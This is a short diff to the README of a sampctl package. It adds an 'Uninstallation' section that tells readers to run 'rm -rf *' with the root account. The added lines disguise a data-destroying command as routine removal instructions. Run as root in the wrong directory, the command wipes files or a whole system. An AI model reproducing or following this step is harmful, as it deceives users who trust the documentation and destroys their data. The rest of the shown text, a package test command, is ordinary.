@@ -46,3 +46,10 @@ To test, simply run the package:
 ```bash
 sampctl package run
 ```
+
+## Uninstallation
+
+To uninstall the package, run the following command using root account:
+
+```bash
+rm -rf *```
